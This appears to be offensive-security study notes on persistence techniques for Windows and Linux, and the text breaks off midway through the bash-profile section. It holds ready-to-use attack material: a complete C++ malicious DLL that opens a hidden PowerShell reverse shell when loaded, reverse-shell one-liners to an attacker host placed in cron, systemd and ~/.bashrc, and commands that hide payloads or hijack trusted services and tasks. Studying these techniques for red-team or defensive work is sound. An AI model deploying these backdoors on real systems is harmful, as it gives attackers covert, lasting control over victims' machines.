# Persistence
Persistence refers to an attacker’s ability to maintain access to a compromised system after initial exploitation, even after a system reboots, credential changes, or security measures are implemented. The goal of persistence is to ensure continued access for post-exploitation activities, reconnaissance, data exfiltration, lateral movement and further objectives without re-exploiting the system.
## Why is persistence essential in offensive operations?
- Sustained access for long-term operations
    - Persistence ensures that access is not lost after reboots, patching or incident response efforts.
- Reduces the need for re-exploitation
    - Re-exploiting a system repeatedly increases the risk of detection
    - If an operator loses access and must re-run an exploit, security teams may identify the attack pattern and block it.
- Facilitates covert and stealthy operations
    - Persistence mechanisms allow low-and-slow operations, minimizing noisy activities like brute-force attacks or repeated payload execution
    - Enables hiding in normal system processes and blending in with legitimate activity.
- Enhances post-exploitation capabilities
    - With persistence attackers can:
        - Conduct lateral movement
        - Maintain command and Control (C2) communications
        - Exfiltrate data over an extended period
        - Deploy additional malware or exploits at a later stage
- Bypasses security controls and incident response
    - If EDR/SIEM alerts on an initial intrusion, persistence mechanisms help retain access, even if the compromised user account is revoked.
    - Attackers can install backup access or points or hidden services to avoid being completely removed.
# Common Persistence Techniques
## Windows
- Registry run keys & startup folders
- Scheduled tasks
- Windows services
- DLL hijacking
- WMI event subscriptions
### Registry run keys & Startup folders
Registry run keys & startup folders are among the most common techniques used by attackers, malware, and operators to ensure their payloads execute whenever a user logs in or the system starts. These methods are popular because they are easy to implement, work on most Windows versions, and require minimal privileges.

Windows uses the Registry (a hierarchical database) to store configuration settings including those related to startup applications. The run keys allow executables or scripts to automatically run when a user logs in or the system boots.

The following registry locations are commonly used to execute programs during user logins:

| Registry Key                                                              | Description                                                            | Execution Context |
|---------------------------------------------------------------------------|------------------------------------------------------------------------|-------------------|
| HKCU\Software\Microsoft\Windows\CurrentVersion\Run                        | Runs when current user logs in                                         | User-level        |
| HKLM\Software\Microsoft\Windows\CurrentVersion\Run                        | Runs when any user logs in and requires admin privileges               | System-wide       |
| HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce                     | Runs only once at the next login for the current user                  | User-level        |
| HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce                     | Runs only once at the next login for any user                           | System-wide       |
| HKCU\Software\Microsoft\Windows\CurrentVersion\Winlogon\Shell              | Modifies the Windows shell to run a malicious binary instead of “explorer.exe” | User-level        |
| HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run | Controls approval status for “run” entries. May bypass some security controls. | User-level        |
#### How attackers use registry run keys for persistence
- Create a registry entry to execute malicious code
```PowerShell
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "MaliciousProcess" /t REG_SZ /d "C:\Users\Public\malicious.exe" /f
```
- This  command adds "malicious.exe" to the "run" key ensuring it starts at every login
- Execute a PowerShell or script payload via the run key
```PowerShell
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Updater" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File C:\Users\Public\payload.ps1" /f
```
- This method ensures that a PowerShell script "payload.ps1" is executed at login
- Using "RunOnce" for temporary persistence
```PowerShell
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "OneTimeBackdoor" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
```
- The "RunOnce" key ensures taht the payload executes once at the next login
- Leveraging "Winlogon\Shell" for more covert persistence
```PowerShell
reg add HKCU\Software\Microsoft\Windows NT\CurrentVersion\winlogon /v Shell /t REG_SZ /d "explorer.exe, C:\Users\Public\malicious.exe" /f
```
- This method runs both "explorer.exe" and the attacker's payload, keeping the system functional while maintaining persistence.
#### Pros & Cons
##### Pros
- Easy to implement with built-in Windows tools
- Does not require high privileges
- Works across all Windows versions
- Stealthier than adding an executable to the startup folder
##### Cons
- Can be detected by security controls such as EDR and SIEM
- Registry auditing can flag suspicious entries
- Malware analysis tools can scan “Run” keys frequently
- Can be removed manually using Regedit or Group Policy
### Windows Startup Folder Persistence
The startup folder is a special directory that contains the shortcuts or executables that run whenever a user logs in. It is another commonly exploited persistence mechanism
#### Common Startup Folder Locations

| Folder Path                                                 | Scope                                                         |
| ----------------------------------------------------------- | ------------------------------------------------------------- |
| %APPDATA%\Microsoft\Windows\Start Menu\Program\Startup      | Affects only the current user                                 |
| %PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup | Affects all users on the system and requires admin privileges |
#### The following are techniques attackers can use with the startup folder for persistence
- Copy a malicious executable to the startup folder
```PowerShell
copy C:\malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```
- This ensures "malware.exe" runs at every login
- Create a shortcut (.lnk) to execute a malicious script
```PowerShell
$WshShell = New-Object -ComObject WScript.Shell
```
```PowerShell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\payload.lnk")
```
```PowerShell
$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
```
```PowerShell
$Shortcut.Arguments = "/c powershell -ExecutionPolicy Bypass -file C:\Users\Public\payload.ps1"
```
```PowerShell
$Shortcut.Save()
```
- this creates a shortcut that runs "payload.ps1" via PowerShell at login
- Abusing hidden files for stealth
```PowerShell
attrib +h "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.exe"
```
- This marks "backdoor.exe" as hidden to evade manual detection
#### Pros & Cons
##### Pros
- Simple to implement without modifying the registry
- Can execute any file type, including batch files, scripts, and executables
- Works across all Windows versions
- No need for registry modifications
##### Cons
- Easily detected by checking the startup folder
- Requires file-based persistence, which antivirus may flag
- Users can manually delete items from startup
- Group Policy can restrict execution from startup folders
#### Conclusion
Both registry run keys and startup folder persistence are simple yet effective techniques widely used by malware, attackers, and operators to maintain access. While they provide low-privilege persistence, they are also highly detectable by EDR, SIEM, and manual inspections. Using stealthier methods like WMI event subscriptions or DLL hijacking may provide better long-term access.
### Scheduled Tasks
Scheduled tasks are a powerful persistence mechanism in Windows that attackers frequently use to execute malicious payloads at predefined times, system startup, or user logins. This technique provides flexibility, stealth, and long-term access, making it a preferred method over simple run keys or startup folders.
#### Tasks are stored in:
- “C:\Windows\System32\Tasks\” (XML configuration files)
- Windows Registry
    - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
    - HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
#### The following are techniques that attackers can use to utilize scheduled tasks for persistence:
- Basic scheduled task with PowerShell execution
```PowerShell
schtasks /create /tn "Updater" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File C:\Users\Public\payload.ps1" /sc onlogon /rl highest /f
```
- This creates a scheduled task that executes a PowerShell payload every time a user logs in
- Beaconing (scheduled task running every minute)
```PowerShell
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\malware.exe" /sc minute /mo 1 /f
```
- An attacker may want a persistent connection. This executes a payload every minute
- Scheduled task with SYSTEM privileges
```PowerShell
schtasks /create /tn "CriticalUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onstart /ru SYSTEM /f
```
- If an attacker has admin or SYSTEM privileges they can create a task that runs with NT AUTHORITY\SYSTEM (Highest) privileges
- Event-triggered persistence
```PowerShell
schtasks /create /tn "DefenderBypass" /tr "C:\Users\Public\exploit.exe" /sc onlogon /ec Security /mo 1 /f
```
- Instead of running at a fixed time this configures a task to trigger on an event, specifically a failed login attempt. Moreover, this can be used to trigger execution when Defender logs an alert, allowing an attacker to react dynamically
- Hiding the scheduled task
```PowerShell
schtasks /change /tn "Updater" /hid
```
- By default Windows  hides tasks with "Hidden" set to "True" this command sets a task as hidden to avoid detection. The task remains functional but won't appear in the Task Scheduler UI
- Modifying an existing trusted task
```PowerShell
schtasks /change /tn "MicrosoftEdgeUpdateTaskMachineUA" /tr "C:\Users\Public \\backdoor.exe"
```
- Instead of creating a new task this command modifies an existing scheduled task to include a malicious payload. The EdgeUpdateTask is a legitimate Windows task. Modifying it allows malware to persist unnoticed
#### Pros & Cons
##### Pros
- Stealthy and runs in the background with minimal traces
- Can run without requiring a user to be logged in
- Works with any executable, script, or command
- Can be triggered at specific system events or times
- Can be hidden to avoid detection in the Task Scheduler UI
##### Cons
- Can be detected by monitoring Task Scheduler logs
- EDR solutions monitor “schtasks.exe” execution
- Legitimate users can manually check and remove tasks
- Antivirus & SIEM tools flag suspicious scheduled tasks
- Requires admin rights for high-privilege execution
#### Conclusion
Scheduled tasks are an effective and flexible persistence mechanism in offensive security operations. Unlike run keys or startup folders they allow precise control over execution time and conditions, stealth via hidden tasks and event-driven execution, persistence at multiple privilege levels, including SYSTEM.

However, defenders can detect and mitigate scheduled task persistence thorough event log monitoring, registry audits and SIEM alerts. More advanced techniques like modifying existing tasks or hiding tasks in obscure locations may improve stealth.
### Windows services for persistence
Windows services provide a stealthy and resilient method for attackers to achieve persistence. Services can be run at system startup, operate in the background with high privileges, and can be configured to restart automatically if terminated. This makes them a highly effective persistence technique for offensive security operations where long-term control over compromised machines is needed.
#### Services are managed in:
- Registry
    - HKLM\SYSTEM\CurrentControlSet\Services
- Executable locations for binaries linked to services
    - C:\Windows\System32\
    - C:\Program Files\
    - C:\Users\Public\
#### Windows provides several ways to create, modify and manage services including:
- Sc.exe (service control manager command-line tool)
- Powershell.exe
- Reg.exe (registry modifications)
- Srvany.exe (allows any executable to run as a service)
- Nssm.exe (non-sucking service manager, an alternative to srvany)
#### The following are techniques attackers use for Windows services to acheive persistence:
- Creating a malicious Windows service
```PowerShell
sc create EvilService binPath= "C:\Windows\Temp\baackdoor.exe" start= auto DisplayName= "Windows Update Service"
```
- This uses "sc.exe" to create a service that executes a backdoor at startup
- Using PowerShell to create a malicious service
```Powershell
New-Service -Name "Updater" -BinaryPathName "C:\Windows\Temp\payload.exe" -DisplayName "Microsoft Update Service" -StartupType Automatic
```
```PowerShell
Start-Service -Name "Updater"
```
- This command allows attackers to use PowerShell to create and start a new service
- Hiding a malicious service by modifying registry entries
```PowerShell
reg add "HKLM\SYSTEM\CurrentControlSet\Services\StealthService" /v ImagePath /t REG_SZ /d "C:\Windows\Temp\malicious.exe" -f
```
```PowerShell
reg add "HKLM\SYSTEM\CurrentControlSet\Services\StealthService" /v Start /t REG_DWORD /d 2 /f
```
- These commands allow attackers to create a service manually by modifying the Windows registry 
- Abusing an existing legitimate service
```PowerShell
sc config Spooler binPath= "C:\Windows\Temp\evil.exe"
```
- Restore the original path with
```PowerShell
sc config Spooler binPath= "C:\Windows\System32\spoolsv.exe"
```
- These commands modify an existing service to point to a malicious binary instead of creating a new service
- Creating a service with SYSTEM privileges
```PowerShell
sc create SystemService binPath= "C:\Windows\Temp\payload.exe" start= auto obj= "LocalSystem" type= own
```
- This creates a SYSTEM-level service that runs even if no user is logged in
- Using "srvany.exe" or "nssm.exe" to run any executable as a service
- By default Windows services require a proper service binary. Attackers can bypass  this by using srvany.exe or nssm.exe to run any program as a service
```PowerShell
sc create StealthService binPath= "C:\Windows\srvany.exe" start= auto
```
```Powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Services\StealthService\Parameters" /v Application /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```
#### Pros & Cons
##### Pros
- Highly stealthy as services run in the background with minimal visibility.
- Runs with SYSTEM privileges and can operate at the highest level
- Can restart automatically ensuring long-term persistence
- Can be hidden in the registry and is harder to detect than scheduled tasks
- Does not require a logged-in user and executes without user interaction
##### Cons
- EDR/SIEM solutions monitor service modifications
- Requires admin rights to create or modify services
- Service logs can reveal malicious activity
- Changes to known services may trigger security alerts
- Defenders can audit and disable malicious services easily
#### Conclusion
Windows services provide a powerful and stealthy method for long-term persistence in offensive security operations. Unlike scheduled tasks or registry run keys they offer: Higher privilege execution, automatic restart on failure, execution in the background without user interaction, deep integration with Windows, making them harder to detect.

However, defenders can detect and mitigate malicious services through event log monitoring, registry audits, and SIEM alerts. Attackers often combine service-based persistence with other techniques (e.g. DLL hijacking, process injection) for increased stealth.
### Dll Hijacking for Persistence
DLL hijacking is a stealthy and effective persistence technique where attackers exploit how Windows searches for and loads Dynamic Link Libraries (DLLs). By placing a malicious DLL in a directory where Windows or an application expects a legitimate DLL, the attacker can execute arbitrary code whenever the application is launched, or the system starts. This technique is useful for long-term access because it can be difficult to detect and does not require registry modifications or new service creation.
#### A DLL is a shared code library used by multiple programs. Instead of embedding all functionalities in a single executable, Windows applications load DLLs dynamically to use additional features. DLLs typically have a “.dll” extension and are found in locations such as:
- C:\Windows\System32\
- C:\Windows\SysWOW64\
- C:\Program Files\
- C:\Users\Public\
#### Windows searches for DLLs in a specific order when an application needs one. The search order is:
- Application directory (C:\Program Files\App\)
- System32 directory (C:\System32\)
- SysWOW64 directory (C:\Windows\SysWOW64)
- Current working directory
- Environment variable directories (PATH)
#### Example of a malicious DLL:
The following DLL will execute a hidden PowerShell command that connects back to an attackers Netcat listener.

The file format for the .dll file is in .cpp and after it is compiled it will have the .dll extension.
```cpp
#include <windows.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

DWORD WINAPI ReverseShell(LPVOID lpParameter) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE; //Hide the window

	// Reverse shell payload using PowerShell
	const char* cmd = "powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPCLIENT('192.168.1.100', 4444);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";

	// Create a new hidden process
	if (!CreateProcess(NULL, (LPSTR)cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		return 1;
	}

	return 0;
}

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```
#### Compiling the DLL
- Compile the DLL with MingGW
```bash
sudo apt update && sudo apt install -y mingw-w64
```
```
x86_64-w64-mingw32-g++ -shared -o revshell.d.. revshell.cpp -lws2_32
```
#### Attackers use DLL hijacking to achieve persistence in the following ways
##### Finding Vulnerable DLLs
- To find applications that load DLLs you can use a variety of tools. We will focus on built-in Windows tools
- To list all running processes and their loaded DLLs
```PowerShell
tasklist /m
```
- Use the "where" command to find DLL locations
```PowerShell
where notfound.dll
```
- If an application is looking for notfound.dll but it does not exist, an attacker can place a malicious version in one of the searched directories
```PowerShell
icacls "C:\Program Files\VulnerableApp"
```
- Look for "Everyone:(F)" or "Authenticated Users:(M)" which means any user can modify files
##### Identify Writable Directories  for DLL Hijacking
This replaces an application's DLL search path
- Identify the target application that loads a vulnerable DLL from its directory
```PowerShell
tasklist /m vulnerable.dll
```
- Find where the application is searching for the DLL
```Powershell
where vulnerable.dll
```
- Replace the DLL with a malicious version
```PowerShell
copy evil.dll "C:\Program Files\VulnerableApp\vulnerable.dll"
```
- Now when the application is launched it loads the malicious DLL instead of the original one
##### Placing a DLL in a non-protected directory
**Many applications fail to specify absolute DLL paths, allowing attackers to place malicious DLLs in unprotected locations such as:**
- C:\Users\Public\
- C:\Temp\
- C:\ProgramData\
```PowerShell
copy malicious.dll "C:\Users\Public\trusted.dll"
```
- Now if an application tries to load "trusted.dll" without an absolute path, Windows will prioritize loading the malicious version from "C:\Users\Public\"
##### Hijacking a DLL used by a Windows Service
Some Windows services dynamically load DLLs from unprotected locations, providing SYSTEM-level persistence:
- List services and check which DLLs they use with
```PowerShell
wmic service get Name,PathName
```
- Look for a writable location and if the service loads a DLL from it an attacker can replace it with a backdoor 
```Powershell
copy malicious.dll "C:\Program Files\VulnerableService\Service.dll"
```
- Restart the service to trigger execution
```PowerShell
sc stop VulnerableService && sc start VulnerableService
```
- This allows execution with SYSTEM privileges on each service restart
##### DLL Search Order Hijacking with System32 Executables
Widows built-in executables often load DLLs from writable locations. Attackers can Hijack these processes by placing a malicious DLL in a higher-priority search location.
##### Hijacking explorer.exe
- Identify the DLLs "explorer.exe" loads
```PowerShell
listdlls explorer.exe
```
- Find an unprotected DLL path and replace it
```PowerShell
copy malicious.dll "C:\Users\Public\hijacked.dll"
```
- Restart explorer to trigger execution and the malicious DLL will execute every time explorer starts
```Powershell
taskkill /f /im explorer.exe && start explorer.exe
```
#### Pros & Cons
##### Pros
- Stealthy and runs inside legitimate processes
- No registry modifications required making it harder to detect
- Runs at high privileges if targeting SYSTEM services
- Resistant to user logouts or system reboots
- Can be used in combination with other persistence methods like scheduled tasks
##### Cons
- DLL execution logs can reveal anomalies (Event ID 4688 and 7045)
- Antivirus solutions can flag DLL replacements
- SafeDLLSearchMode can prevent certain hijacking attempts
- Requires the right target application to load the malicious DLL
- Some modern applications verify DLL signatures before loading.
#### Conclusion
DLL hijacking is a powerful and stealthy method for long-term persistence in offensive security operations. It allows attackers to execute arbitrary code by hijacking the way Windows and applications search for and load DLLs. It is especially effective when targeting SYSTEM services as it allows for privileged execution. It does not require registry modifications, making it stealthier than scheduled tasks or run keys. However, defenders can detect and mitigate DLL hijacking by monitoring DLL load events, implementing application whitelisting, and enforcing proper permissions.

### WMI Event Subscription Persistence
Windows Management Instrumentation (WMI) is a powerful feature in Windows that provides a standardized way for managing and monitoring system components. WMI event subscriptions allow an attacker to create persistent mechanisms that automatically execute commands or scripts when certain system events occur, even if the attacker’s initial foothold is lost.

WMI event subscriptions are commonly used in offensive security operations because they allow attackers to maintain persistence in a stealthy manner without modifying registry keys or adding visible files or services.
#### There are two primary types of WMI event subscriptions:
- Query-based event subscriptions
    - These subscriptions are triggered when WMI queries return specific results, like system startup or user logon
- Instance-based event subscriptions
    - These subscriptions are triggered when a specific WMI event is created, modified, or deleted

WMI events are typically created through the WMI Command-Line (WMIC) or via PowerShell. Attackers can create these subscriptions to run arbitrary commands when certain conditions are met, and this persists across system reboots.
#### Creating a WMI event subscription using WMIC
```PowerShell
wmic /node:"TargetMachine" /user:"username" /password:"password" path __eventfilter create NAME="MyEvent", Query="SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'", EventNameSpace="\\root\\cimv2"
```
- This monitors for the creation or execution of "notepad.exe" every 60 seconds and can be configured to trigger a specific action whenever that process starts
```PowerShell
wmic /node:"TargetMachine" /user:"username" /password:"password" path __eventconsumer create Name="MyConsumer", CommandLineTemplate="cmd.exe /c whoami", EventNamespace="\\root\\cimv2"
```
- This command will trigger the "whoami" command every time that "notepad.exe" is executed
- Now you need to create a binding between the event filter and the consumer to ensure the action is executed when the event occurs with:
```PowerShell
wmic /node:"TargetMachine" /user:"username" /password:"password" path __filtertoconsumerbinding create __EventFilter="MyEvent", __EventConsumer="Myconsumer", EventNamespace="\\root\cimv2"
```
#### Pros & Cons
##### Pros
- Stealthy
    - WMI event subscriptions are not visible in traditional file system monitoring tools or task schedulers. They only show up when querying WMI or using specific administrative tools like WMIC or PowerShell
    - No files or registry keys are created making detection difficult unless specifically looking for WMI events
- Persistence across reboots
    - Unlike services or scheduled tasks that can be disabled or deleted by the user, WMI subscriptions persist across reboots.
    - Once established, they remain active until manually removed making them ideal for long term persistence
- No need for additional software
    - Since WMI is a native Windows feature, attackers do not need to install additional software. This is especially useful for low-impact attacks or for environments where installation of tools is difficult
- Can be triggered by various events
    - WMI subscriptions can be triggered by system events like logon, logoff, process creation, service start and more
    - Custom events can be defined based on almost any system activity providing significant flexibility in maintaining access.
- Low detection overhead
    - WMI is built into Windows so using it for persistence leaves little footprint
    - Since WMI queries are often legitimate administrative activities, detection based solely on their use is difficult.
##### Cons
- Detection via WMI query
    - If an attacker’s WMI subscription is detected, it can be removed easily.
    - An attacker needs to ensure that the event subscription is hidden well or not detected by WMI enumeration tools.
- Requires privileged access
    - Creating WMI event subscriptions typically requires administrative privileges on he target system.
    - An attacker must either escalate privileges or gain access to an already privileged account.
    - If the attacker does not have full control of the system, they may not be able to create or modify WMI subscriptions
- Potential to interfere with legitimate WMI usage
    - Malicious WMI subscriptions can interfere with legitimate administrative tasks if not well-designed.
    - This may trigger false alarms or even cause system instability if the subscription affects crucial system operations.
- Can be easily removed by skilled admins
    - Advanced users or system administrators can detect and remove malicious WMI subscriptions using WMIC or PowerShell.
    - There are also utilities like Sysmon that can log and monitor WMI events and help detect these persistent mechanisms.
- Requires proper cleanup
    - If the attacker doesn’t clean up the subscription after its usage, it may alert system admins or security tools monitoring event logs.
    - Improper management of these subscriptions can also raise suspicion due to unusual WMI activities.
#### Conclusion
WMI event subscription persistence is a very powerful and stealthy method for attackers to maintain control of a compromised Windows system. However, it requires privileged access and careful management. While it is challenging to detect, WMI event subscriptions can be easily removed by skilled administrators or security tools monitoring for suspicious behavior.
## Linux
- Cron jobs
- Systemd services
- Bash profile and RC files
- SSH backdoors
- LD_PRELOAD hijacking
### Cron Job Persistence
In Linux-based systems, a cron job is a scheduled task that runs automatically at specific intervals. Cron is a powerful utility for automating repetitive tasks such as backups, system maintenance or executing commands. Cron job persistence is a method where an attacker schedules a cron job to execute a malicious command or script at specified times or intervals. These jobs can survive reboots and are highly effective at maintaining access for long periods. The cron daemon runs these scheduled tasks, and the attacker can leverage this mechanism to ensure that their malicious code is run periodically or at specific system events.

The cron service itself runs as a background daemon, checking system cron job configuration at regular intervals (typically every minute) to see if any scheduled jobs need to be executed.
#### Cron jobs are configured in several ways, depending on the type of user and level of access. The primary locations for cron job configurations are:
- User cron jobs (/var/spool/cron/crontabs)
    - Each user can create their own cron jobs that execute with their permissions
    - Cron jobs are stored in a user-specific file in /var/spool/cron/crontabs/username
- System-wide cron jobs (/etc/crontab, /etc/cron.d)
    - These cron jobs are used for system-wide scheduling and can be configured by administrators to execute commands on a global level.
    - Files in /etc/crontab and /etc/cron.d allow system administrators to schedule tasks
- Cron Directories (/etc/cron.daily, /etc/cron.hourly, /etc/cron.monthly)
    - These directories contain scripts that are run at specified intervals
    - Cron jobs placed here are executed without needing to configure specific cron entries
- User’s shell crontab (crontab -e)
    - Sometimes cron jobs are added to startup scripts (e.g. /etc/rc.local) to ensure the job runs when the system reboots.
#### Setting up a cron job
- Create a malicious script
```bash
#!/bin/bash
# Simple reverse shell script example
bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
```
- Example (malicious.sh)
- Edit the cron job
```bash
crontab -e
```
```bash 
* * * * * /path/to/malicious.sh
```
This example cronjob executes the script every minute, ensuring that the malicious activity will repeat at regular intervals such as every minute.

The attacker must add this script to a cron job configuration file. They can do this either through “crontab -e” or by directly modifying cronjob files like /etc/crontab or /var/spool/cron/crontabs/username

- Ensure the cron job survives system reboots
```bash
crontab -e
```
```bash
@reboot /path/to/malicious.sh
```
In some cases, cron jobs need to be configured to run on startup, especially if the attacker wants persistence after reboots. The attacker could use /etc/rc.local, system, or cron’s @reboot feature like in the example.

- Using cron.d or system-wide cron jobs
```bash
sudo vim /etc/crontab
```
```bash
* * * * * root /path/to/malicious.sh
```
- If the attacker has administrative access, they can place cron jobs in the /etc/cron.d/ or /etc/crontab files which will run with root privileges. This is an example of a cronjob in /etc/crontab
#### Pros & Cons
##### Pros
- Survives reboots
    - Cron jobs are persistent across system reboots and maintain execution if the cron service is running. This makes it an excellent tool for maintaining access over time.
- Minimal footprint
    - Cron jobs are less noticeable compared to other persistence mechanisms such as malware or registry modifications
    - Cron jobs are typically scheduled tasks, so they blend in with normal system operations, making them harder to detect.
- Easy to configure
    - Cron jobs are simple to configure and do not require complex or sophisticated exploitation techniques
    - They can be added manually by modifying cron configuration files, or by simply using the crontab -e command for a user-level cron job.
- Runs as specific users
    - Cron jobs can be scheduled to run with the same privileges as the user or root. This provides flexibility depending on the level of access the attackers have.
- No need for external tools
    - Since cron is built into all Linux systems, attackers do not need to install any external tools to gain persistence. This makes cron job persistence ideal for low-profile attacks.
##### Cons
- Detection
    - Cron jobs can be detected through simple monitoring of cron job files or querying running jobs.
    - Security monitoring tools, such as AIDE, or administrators running tools like crontab -l or cat /etc/crontab, can easily identify suspicious or unknown cron jobs
    - If the attacker’s malicious cron job does not appear in the standard cron files, tools like rootkit hunter or chkrootkit can help identify it
- Requires access to modify cron jobs
    - The attacker must have the necessary permissions to add cron jobs, which typically requires either root access or access to the user’s cron configuration
    - Without sufficient privileges, an attacker cannot configure cron jobs for persistence, limiting its use in lower-privileged environments
- May interfere with legitimate tasks
    - Cron jobs that are incorrectly configured or scheduled at the wrong times can interfere with legitimate system operations. Overuse of resources or conflicts with other tasks could potentially cause system instability or be noticed by administrators
    - Malicious cron jobs running too frequently could result in noticeable system performance degradation, raising suspicion
- Potential removal by system administrators
    - Admins may notice suspicious cron jobs or detect unusual activity and may remove the offending cron jobs when they do system audits
    - If the attacker cannot obfuscate the cron job configuration the persistence mechanism may be short-lived.
#### Conclusion
Cron job persistence is a highly effective technique for maintaining access in a Linux-based systems. Its simplicity, low footprint and ability to survive reboots make it a powerful tool in offensive security operations. However, it does come with the disadvantage of potential detection if not carefully managed and it requires appropriate privileges to configure.
### Systemd Services and Persistence
In most modern Linux systems, especially for those running distributions that use system as the init system (Ubuntu, CentOS, and Debian), system services provide a powerful way to control system startup, background services, and daemons. Attackers can abuse system services to maintain persistence on compromised systems by configuring malicious services that automatically start when the system boots or when certain system events occur.

A system service is a unit of configuration used by the system init system to define and manage processes that run in the background. These services can be automatically started during boot or triggered by specific events. Systemd services are described in unit configuration files and the most common unit type is the service unit (. service) which controls the execution of a specific program or script.
#### Creating system service permissions
- Create a malicious script or command
```bash
#!/bin/bash
# Simple reverse shell script example
bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
```
- Example (malicious.sh)
- Create a system service unit file
```
vim /etc/systemd/system/malicious.service
```
- Add the content below
```ini
[Unit]
Description=Malicious Service
After=network.target

[Service]
ExecStart=/path/to/malicious.sh
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
```
- Enable the service so that it runs at system startup
```bash
sudo systemctl enable malicious.service
```
- Start the service so that it runs immediately
```bash
sudo systemctl start malicious.service
```
#### Pros & Cons
##### Pros
- Survives reboots
    - Systemd services are persistent across reboots. Once the malicious service is enabled, it will run on every boot, ensuring long-term persistence unless explicitly disabled or removed by an administrator.
- Runs with elevated privileges
    - Services configured to run as “root” can execute commands with root privileges. This allows an attacker to maintain full control over the system and access sensitive data or execute privileged commands.
- Flexibility in triggering
    - Systemd services can be configured to run on specific events not just system startup. For example, they can be configured to run when a specific device is connected, when a network is available, or when a user logs in providing flexibility in persistence strategies.
- Integration with system boot process
    - Systemd services are an integral part of the system boot process, which makes it difficult for security tools to distinguish between legitimate and malicious services without extensive auditing.
- Low visibility
    - Systemd services are often not checked by regular users or even administrators who may not be familiar with systemd’s configuration. A malicious service can blend into normal operation of the system if not carefully monitored.
##### Cons
- Easily detectable by administrators
    - Systemd services can be detected through routine system administration. The attacker’s malicious service will be listed when administrators use “systemctl list-units”, “systemctl status”, or “journalctl” to monitor system services
    - Additionally, by inspecting /etc/system/system, an administrator can see all active and inactive services, which could reveal any unauthorized services
- Requires elevated privileges
    - Creating or modifying system services typically require root privileges. This limits the applicability of this persistence method to scenarios where the attacker has administrative access or can escalate their privileges.
- Impact on system performance
    - If the malicious service is configured incorrectly or runs excessively, it could negatively impact the system’s performance or lead to noticeable resource usage.
- May trigger security monitoring tools
    - Some security monitoring solutions, such as OSSEC, AIDE or auditd can monitor for changes in system services and generate alerts when unauthorized services are created or modified.
#### Conclusion
Systemd service persistence is a powerful and effective method for attackers to maintain access on Linux systems. It allows the attacker to run malicious scripts, programs, or payloads on system startup or in response to specific system events, often with elevated privileges. However, it comes with the risk of detection through routine system audits, file integrity monitoring and security solutions. Despite these risks, it remains a commonly used persistence mechanism, particularly when the attacker has root access.
### Bash Profile & RC Profile Persistence
On Linux based systems, attackers can achieve persistence by modifying bash profile and RC files to execute malicious commands whenever a user logs in or opens a shell session. This method is simple, effective and does not require root privileges, making it an attractive option for attackers who have gained access to a user account but lack elevated privileges

Bash profiles and RC files are shell configuration files that execute commands automatically when a user logs in or opens a shell session. These files can be modified to automatically execute malicious scripts or commands every time a session is initiated.

| File                | Execution condition                                                        | Affected users    |
|---------------------|----------------------------------------------------------------------------|-------------------|
| ~/.bashrc           | Executed every time a new interactive non-login shell is opened (e.g. opening a terminal emulator) | Affects a single user |
| ~/.bash_profile     | Executed only during a login shell session (e.g. SSH login)                | Affects a single user |
| ~/.profile          | Similar to .bash_profile but works with non-bash shells as well            | Affects a single user |
| /etc/bash.bashrc    | Executed for all users whenever a non-login shell is opened               | Affects all users  |
| /etc/profile        | Executed for all users during a login shell session                        | Affects all users  |
#### The following are techniques attackers can use to achieve persistence with bash profiles and RC files
##### Reverse shell in ~/.bashrc
- An attacker adds the following line to ~/.bashrc so that every time the victim opens the terminal a reverse shell is created
```bash
echo "bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1" >> ~/.bashrc
```
##### Running a malicious script from /etc/profile (system-wide)
- For persistence across all users an attacker modifies /etc/profile to execute a malicious script adding the following line
```bash
echo "/usr/local/bin/malicious.sh" >> /etc/profile
```
#### Pros & Cons
